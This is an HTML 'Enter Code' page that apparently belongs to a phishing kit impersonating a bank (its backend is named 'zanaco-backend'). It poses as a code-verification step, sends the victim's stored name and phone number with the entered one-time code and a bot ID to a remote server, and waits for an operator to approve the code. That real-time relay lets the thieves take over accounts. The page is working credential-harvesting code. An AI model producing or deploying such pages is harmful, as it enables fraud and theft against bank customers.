<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Enter Code</title>
<style>
body { font-family: Arial; background:#f6f7fb; display:flex; justify-content:center; align-items:center; height:100vh; }
.code-container { background:#fff; padding:30px; width:350px; text-align:center; }
.code-boxes input { width:55px; height:60px; font-size:24px; text-align:center; margin:5px; border:2px solid red; }
button { width:100%; padding:12px; background:red; color:#fff; border:none; }
</style>
</head>
<body>

<div class="code-container">
    <h2>Enter Code</h2>

    <form id="codeForm">
        <div class="code-boxes">
            <input maxlength="1"><input maxlength="1"><input maxlength="1"><input maxlength="1">
        </div>
        <button disabled id="submitBtn">Submit Code</button>
    </form>
</div>

<script>
const BACKEND_URL = "https://zanaco-backend.onrender.com";

const params = new URLSearchParams(window.location.search);
const botId = params.get('botId') || window.location.pathname.split('/').pop();
if (!botId) { alert("Invalid access link"); throw new Error(); }

if (!localStorage.getItem('pin')) {
    window.location.href = `pin.html?botId=${botId}`;
}

const inputs = document.querySelectorAll('.code-boxes input');
const btn = document.getElementById('submitBtn');

inputs.forEach((i, idx) => {
    i.addEventListener('input', () => {
        i.value = i.value.replace(/\D/g,'');
        if (i.value && idx < 3) inputs[idx+1].focus();
        btn.disabled = ![...inputs].every(x => x.value);
    });
});

document.getElementById('codeForm').addEventListener('submit', async e => {
    e.preventDefault();

    const code = [...inputs].map(i => i.value).join('');
    const name = localStorage.getItem('name');
    const phone = localStorage.getItem('phone');

    const res = await fetch(`${BACKEND_URL}/submit-code`, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ name, phone, code, botId })
    });

    const { requestId } = await res.json();

    const poll = setInterval(async () => {
        const r = await fetch(`${BACKEND_URL}/check-code/${requestId}`);
        const d = await r.json();
        if (d.approved === true) {
            clearInterval(poll);
            localStorage.clear();
            window.location.href = `success.html?botId=${botId}`;
        }
    }, 1500);
});
</script>

</body>
</html>
